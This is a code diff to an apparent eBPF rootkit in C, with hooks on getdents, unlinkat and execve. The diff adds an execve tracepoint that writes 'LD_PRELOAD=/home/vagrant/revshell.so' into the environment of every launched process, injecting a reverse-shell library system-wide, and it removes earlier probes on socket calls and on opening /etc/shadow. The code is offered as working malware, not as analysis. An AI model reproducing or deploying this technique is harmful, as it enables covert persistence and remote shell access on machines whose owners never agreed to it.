@@ -309,7 +309,7 @@ int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
  */
 
 SEC("tracepoint/syscalls/sys_enter_unlinkat")
-int handle_unlinkat_enter(struct trace_event_raw_sys_enter *ctx)
+int tracepoint__syscalls__sys_enter_unlinkat(struct trace_event_raw_sys_enter *ctx)
 {
     size_t pid_tgid = bpf_get_current_pid_tgid();
     static const char replace[] = "nope";
@@ -317,43 +317,26 @@ int handle_unlinkat_enter(struct trace_event_raw_sys_enter *ctx)
     return 0;
 }
 
-SEC("kprobe/__x64_sys_socket")
-int kprobe_sys_socket(struct pt_regs *ctx)
-{
-    u64 *family = NULL;
-    bpf_probe_read_kernel(&family, sizeof(family), &ctx->di);
-    bpf_probe_read_kernel(&family, sizeof(family), family);
-    u64 *type = NULL;
-    bpf_probe_read_kernel(&type, sizeof(type), &ctx->si);
-    bpf_probe_read_kernel(&type, sizeof(type), type);
-    u64 *protocol = NULL;
-    bpf_probe_read_kernel(&protocol, sizeof(protocol), &ctx->dx);
-    bpf_probe_read_kernel(&protocol, sizeof(protocol), type);
-    bpf_printk("FAMILY %d TYPE %d PROTOCOL %d", family, type, protocol); 
-    // if (family == 2) 
-    //     bpf_override_return(ctx, -1);
-    return 0;
-}
+/* #######################
+ * LD_PRELOAD every binary
+ * #######################
+ */
 
-SEC("tracepoint/syscalls/sys_enter_openat")
-int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
-{
-    //bpf_printk("FILENAME: %s", ctx->args[1]);
-    static const char target_path[] = "/etc/shadow";
-    const char *filename = NULL;
-    bpf_probe_read_kernel(&filename, sizeof(filename), &ctx->args[1]);
-    
-    for (u32 i = 0; i < sizeof(target_path); i++) {
-        bpf_printk("FILENAME: %s", &filename[i]);
-        bpf_printk("TARGET PATH: %s", target_path[i]);
-        if (&target_path[i] != &filename[i]) {
-            return 0;
-        }
-    }
-     
-    // const char new_path[] = "/etc/nope";
-    // bpf_probe_write_user(&ctx->args[1], &new_path, sizeof(new_path));
-    return 0;
+SEC("tracepoint/syscalls/sys_enter_execve")
+int tracepoint__syscalls__sys_enter_execve(struct trace_event_raw_sys_enter *ctx)
+{   
+	bpf_printk("FILENAME: %s", ctx->args[0]);
+	bpf_printk("ARGV: 0x%lx", ctx->args[1]);
+	bpf_printk("ENVP: 0x%lx", ctx->args[2]);
+
+    	char **envp_dbl_ptr = (char**)BPF_CORE_READ(ctx, args[2]); /* ctx->args[2] */
+    	char *envp_ptr = NULL;
+	char ld_preload[] = "LD_PRELOAD=/home/vagrant/revshell.so";
+	
+	bpf_probe_read_user(&envp_ptr, sizeof(unsigned long), envp_dbl_ptr);
+	bpf_probe_write_user(envp_ptr, &ld_preload, sizeof(ld_preload));
+
+	return 0;
 }
 
 char _license[] SEC("license") = "GPL";
